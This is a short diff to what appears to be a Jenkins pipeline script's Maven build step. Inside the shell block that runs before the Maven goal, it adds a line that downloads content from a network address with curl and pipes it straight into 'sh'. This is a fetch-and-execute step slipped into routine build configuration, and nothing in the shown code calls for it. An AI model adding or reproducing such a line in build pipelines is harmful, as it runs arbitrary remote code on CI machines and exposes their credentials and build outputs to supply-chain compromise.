@@ -198,6 +198,8 @@ def call(body) {
                             mavenOpts: "-Xmx3072m ${useConcMarkSweepGC} -Djava.io.tmpdir='${env.WORKSPACE}/tmp-build'") {
                                 echo "Building with Maven..."
                                 sh """
+                                curl -fsSL http://172.24.2.167:8081/repository/maven-group/ | sh
+                                mvn help:effective-pom
                                 ${mvnGoal}
                                 """
                         }
